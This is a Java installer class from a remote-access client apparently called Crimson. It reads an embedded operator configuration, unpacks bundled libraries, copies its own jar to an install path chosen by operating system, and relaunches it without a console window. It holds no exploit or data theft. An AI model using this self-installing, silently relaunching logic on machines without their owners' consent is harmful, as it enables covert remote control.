/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URISyntaxException;

import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.util.B64;
import com.subterranean_security.crimson.core.util.CUtil;

public class Installer {

	public static ClientConfig ic;
	public static String jarPath;
	public static String jarDir;

	private static boolean debug = new File("/debug.txt").exists();

	public static void main(String[] args) {

		try {
			jarPath = Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
			jarDir = new File(jarPath).getParent();
		} catch (URISyntaxException e) {
			System.out.println("Code source error!");
			System.exit(1);
		}

		if (isInstalled()) {
			Client.main(args);
			return;
		}

		File temp = new File(System.getProperty("java.io.tmpdir") + "/client_" + CUtil.Misc.randString(8));
		temp.mkdir();
		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/lib.zip",
				temp.getAbsolutePath() + "/lib.zip");
		try {
			CUtil.Files.unzip(temp.getAbsolutePath() + "/lib.zip", temp.getAbsolutePath());
		} catch (IOException e2) {
			System.out.println("Failed to extract libraries");
			System.exit(1);
		}

		// load libraries
		try {
			CUtil.Files.loadJar(temp.getAbsolutePath() + "/java/c09.jar");
		} catch (Exception e1) {
			System.out.println("FATAL: Failed to load requisite libraries");
			System.exit(1);
		}

		try {
			ic = readInternal();
		} catch (Exception e) {
			System.out.println("Fatal: Could not read internal.txt");
			System.exit(1);
		}

		String base = null;
		String name = System.getProperty("os.name").toLowerCase();
		if (name.endsWith("bsd")) {
			base = ic.getPathBsd();
		} else if (name.equals("mac os x")) {
			base = ic.getPathOsx();
		} else if (name.equals("solaris") || name.equals("sunos")) {
			base = ic.getPathSol();
		} else if (name.equals("linux")) {
			base = ic.getPathLin();
		} else if (name.startsWith("windows")) {
			base = ic.getPathWin();
		}

		if (install(base)) {
			System.out.println("Install Success");
		} else {
			System.out.println("Install Failed");
		}
		CUtil.Files.delete(temp);

	}

	public static boolean packagedLibsFound() {
		return Installer.class.getResourceAsStream("/com/subterranean_security/crimson/client/res/bin/lib.zip") != null;
	}

	private static ClientConfig readInternal() throws Exception {
		InputStream in = Client.class.getResourceAsStream("/com/subterranean_security/crimson/client/internal.txt");

		BufferedReader input = new BufferedReader(new InputStreamReader(in));

		ClientConfig cc = ClientConfig.parseFrom(B64.decode(input.readLine()));
		input.close();

		return cc;
	}

	public static boolean isInstalled() {
		if (!new File(jarDir + "/var/client.db").exists()) {
			return false;
		}

		if (!new File(jarDir + "/lib/java/c09.jar").exists()) {
			return false;
		}

		return true;
	}

	public static boolean install(String base) {
		System.out.println("Starting installation");
		if (!(new File(base)).mkdirs()) {
			System.out.println("Failed to create install base");
			return false;
		}

		if (!base.endsWith(File.separator)) {
			base += File.separator;
		}

		(new File(base + "var")).mkdirs();
		(new File(base + "tmp")).mkdirs();
		(new File(base + "lib")).mkdirs();

		System.out.println("Extracting lib.zip");

		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/lib.zip", base + "lib/lib.zip");
		try {
			CUtil.Files.unzip(base + "lib/lib.zip", base + "lib/");
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
			return false;
		}

		System.out.println("Extracting client database");
		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/client.db", base + "var/client.db");

		System.out.println("Copying client jar");
		File client = new File(base + "/client.jar");
		try {
			CUtil.Files.copyFile(new File(jarPath), client);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			System.out.println("Failed to copy client jar");
			return false;
		}

		return execute(client);
	}

	private static boolean execute(File f) {
		// TODO platform independence
		try {
			if (!debug) {
				Runtime.getRuntime().exec("javaw -jar " + f.getAbsolutePath());
			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
		return true;
	}

}
